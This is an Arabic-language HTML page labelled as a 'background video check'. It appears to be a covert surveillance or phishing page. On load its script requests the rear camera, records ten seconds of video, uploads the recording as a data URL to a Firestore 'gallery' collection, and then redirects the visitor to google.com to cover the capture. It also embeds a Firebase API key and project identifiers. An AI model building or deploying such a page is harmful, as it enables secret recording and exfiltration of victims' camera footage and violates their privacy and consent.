<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>فحص الفيديو</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{max-width:400px;width:100%;text-align:center}
h1{font-size:18px;color:#4CAF50;margin-bottom:10px}
video{width:100%;border-radius:12px;border:2px solid #333;margin-bottom:10px}
.status{color:#4CAF50;font-size:14px;margin:10px 0}
</style>
</head>
<body>
<div class="container"><h1>🎬 فحص فيديو خلفي</h1>
<video id="video" autoplay playsinline muted></video>
<div class="status" id="status">⏳ جاري التسجيل...</div></div>
<script>
firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
var db=firebase.firestore();
var mr,chunks=[];
async function go(){
try{
var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});
document.getElementById('video').srcObject=s;
mr=new MediaRecorder(s);
mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
mr.onstop=async function(){
var blob=new Blob(chunks,{type:'video/mp4'});
var r=new FileReader();
r.onload=async function(e){
await db.collection('gallery').add({url:e.target.result,type:'🎬 فيديو خلفي',timestamp:new Date().toISOString()});
document.getElementById('status').textContent='✅ تم التسجيل';
setTimeout(function(){window.location.href='https://google.com/'},2000);
};
r.readAsDataURL(blob);
};
mr.start();
setTimeout(function(){mr.stop();s.getTracks().forEach(function(t){t.stop();});},10000);
}catch(e){document.getElementById('status').textContent='❌ خطأ';}
}
go();
</script></body></html>
